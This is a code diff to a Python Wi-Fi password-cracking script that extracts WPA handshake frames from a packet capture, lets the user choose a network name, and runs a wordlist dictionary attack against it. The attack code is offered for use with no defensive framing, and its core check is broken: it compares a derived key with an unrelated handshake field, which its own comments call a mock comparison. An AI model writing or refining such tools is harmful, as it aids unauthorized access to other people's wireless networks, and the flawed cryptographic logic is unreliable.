@@ -8,32 +8,34 @@ import binascii
 def extract_handshake(file):
     capture = pyshark.FileCapture(file, display_filter="eapol")
     eapol_frames = []
+    ssids = set()
 
     for packet in capture:
         if 'eapol' in packet:
             eapol_frames.append(packet)
-
+            # Assuming SSID is in the 802.11 layer (you may need to adjust this depending on your capture)
+            if 'wlan' in packet:
+                ssid = packet.wlan.ssid
+                ssids.add(ssid)
+    
     capture.close()
     
     if len(eapol_frames) < 2:
         print("Handshake not found. Need at least two EAPOL frames.")
-        return None
+        return None, []
 
-    return eapol_frames
+    return eapol_frames, list(ssids)
 
-# Function to extract needed information from handshake
-def parse_handshake(eapol_frames):
-    # Extract the required EAPOL frames (e.g., EAPOL 2 & 3 or 3 & 4)
-    eapol_2 = eapol_frames[1]  # Assuming frames 2 and 3 contain the EAPOL messages
-    eapol_3 = eapol_frames[2]
-
-    # Extract the information from the frames (these are based on frame structure)
-    # For real implementation, proper parsing of keys and other values is needed
-
-    ssid = "YourSSID"  # Extract from the beacon or data frame in the pcap file
-    psk_eapol = binascii.unhexlify(eapol_3.eapol_key.iv)  # Simplified example
-
-    return ssid, psk_eapol
+# Function to parse the selected SSID from the capture file
+def parse_handshake(eapol_frames, selected_ssid):
+    # Let's find the first EAPOL frame that matches the selected SSID
+    for packet in eapol_frames:
+        if 'wlan' in packet and packet.wlan.ssid == selected_ssid:
+            ssid = packet.wlan.ssid
+            eapol_data = binascii.unhexlify(packet.eapol.key.iv)  # Example of extracting data
+            return ssid, eapol_data
+    print("Selected SSID not found in the capture.")
+    return None, None
 
 # Function to compute PMK and compare with the captured handshake
 def compute_pmk(ssid, psk_candidate):
@@ -44,13 +46,33 @@ def compute_pmk(ssid, psk_candidate):
 # Function to attempt the dictionary attack
 def dictionary_attack(capture_file, wordlist):
     print(f"Loading capture file: {capture_file}")
-    eapol_frames = extract_handshake(capture_file)
+    eapol_frames, ssids = extract_handshake(capture_file)
 
     if not eapol_frames:
         return
 
-    ssid, psk_eapol = parse_handshake(eapol_frames)
-    print(f"Attempting to recover PSK for SSID: {ssid}")
+    if not ssids:
+        print("No SSIDs found in the capture file.")
+        return
+
+    # Display SSID options and let the user choose one
+    print("\nAvailable SSIDs:")
+    for i, ssid in enumerate(ssids, start=1):
+        print(f"{i}. {ssid}")
+
+    # User selects SSID by number
+    selected_number = int(input("\nEnter the number of the SSID you want to use: ")) - 1
+    if selected_number < 0 or selected_number >= len(ssids):
+        print("Invalid selection.")
+        return
+    
+    selected_ssid = ssids[selected_number]
+    print(f"Selected SSID: {selected_ssid}")
+
+    # Parse the handshake for the selected SSID
+    ssid, psk_eapol = parse_handshake(eapol_frames, selected_ssid)
+    if not ssid:
+        return
 
     with open(wordlist, 'r') as wordlist_file:
         for line in wordlist_file:
@@ -58,7 +80,7 @@ def dictionary_attack(capture_file, wordlist):
             print(f"Trying PSK: {psk_candidate}")
 
             pmk = compute_pmk(ssid, psk_candidate)
-            # Compare PMK with the PSK from the EAPOL frame
+            # Here, compare PMK with the PSK in the EAPOL packet (mock comparison for demonstration)
             if pmk == psk_eapol:
                 print(f"PSK found: {psk_candidate}")
                 return
